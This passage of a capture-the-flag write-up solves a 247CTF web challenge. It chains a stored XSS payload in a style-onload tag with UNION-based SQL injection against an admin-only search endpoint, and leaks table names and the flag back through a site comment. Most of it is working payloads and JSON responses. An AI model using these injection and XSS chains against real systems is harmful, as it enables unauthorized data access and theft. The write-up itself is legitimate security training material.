We see 6 columns here, in the result set retrieved as a JSON object from the server, with 2nd and 6th column being strings and the remaining, numbers

We see this as OR 1=1 condition is always true and gets concatenated to the SELECT query which therefore returns all rows and — marker makes the rest of the query as a comment (more details may be found in basic SQL injection resources)

Now let’s try to get the names of the tables in the current databases through a UNION SELECT query (sqlite_master is a master table in SQLite that has information about all tables and databases in the system)

```
xhr.send("search=1 OR 1=1 UNION SELECT 1,name,1,1,1,name FROM sqlite_master--");
```

We get the following response from the admin

```
{"message":[[0,"Administrator",100,100,100,"New York, USA"],[1,"Michael Owens",14,22,3,"Sydney, Australia"],[1,"comment",1,1,1,"comment"],[1,"flag",1,1,1,"flag"],[1,"sqlite_autoindex_user_1",1,1,1,"sqlite_autoindex_user_1"],[1,"user",1,1,1,"user"],[2,"Alice Brock",72,132,28,"Amsterdam, Nederland"],[3,"Sally Alterman",3,1,0,"Berlin, Germany"]],"result":"success"}
```

We see a table named flag in the result

Let us try to UNION SELECT data from this table. We first discover that it has a column named flag, through this SQL injection payload

I used the following modified payload with single quotes and double quotes interchanged

```
<style onload="
var xhr = new XMLHttpRequest();
xhr.open('POST', '/secret_admin_search', true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.onreadystatechange = function() {
if (xhr.readyState === XMLHttpRequest.DONE) {
if (xhr.status === 200) {
var base64Data = btoa(xhr.responseText);
var xhr2 = new XMLHttpRequest();
xhr2.open('POST', '/comment/3', true);
xhr2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr2.send('comment=Hello from :' + document.domain + '\\n' + encodeURIComponent(base64Data));
}
}
};
xhr.send('search=2 OR 1=1 UNION SELECT 1, sql, 1, 1, 1, sql FROM sqlite_master WHERE type=\'table\' AND name=\'flag\';');
"></style>
```

```
xhr.send('search=2 OR 1=1 UNION SELECT 1, sql, 1, 1 FROM sqlite_master WHERE type=\'table\' AND name=\'flag\';');
```

Please notice the last line for the SQL injection query

We get the result

```
{"message":[[0,"Administrator",100,100,100,"New York, USA"],[1,"CREATE TABLE flag (flag text)",1,1,1,"CREATE TABLE flag (flag text)"],[1,"Michael Owens",14,22,3,"Sydney, Australia"],[2,"Alice Brock",72,132,28,"Amsterdam, Nederland"],[3,"Sally Alterman",3,1,0,"Berlin, Germany"]],"result":"success"}
```

which allows us to infer a column named flag from the CREATE TABLE command that we retreived

We finally retreive the flag with the following SQL injection

```
xhr.send("search=1 OR 1=1 UNION SELECT 1,flag,1,1,1,flag FROM flag--");
```

Hurray, we finally decode the base64 in /user/3 to get our flag

```
{"message":[[0,"Administrator",100,100,100,"New York, USA"],[1,"247CTF{d68583ea43910ddb752396ac914a54d6}",1,1,1,"247CTF{d68583ea43910ddb752396ac914a54d6}"],[1,"Michael Owens",14,22,3,"Sydney, Australia"],[2,"Alice Brock",72,132,28,"Amsterdam, Nederland"],[3,"Sally Alterman",3,1,0,"Berlin, Germany"]],"result":"success"}
```

The flag hex has been modified keeping the structure of the query result unchanged (There is one row in the flag table with a single column flag)

Phew!! That was a long write. Hope you found this writeup a useful guide to solving the challenge and understanding the related concepts. Please give me claps 👏 if you liked the blog post and follow me to see more such detailed and insightful writeups from me

---
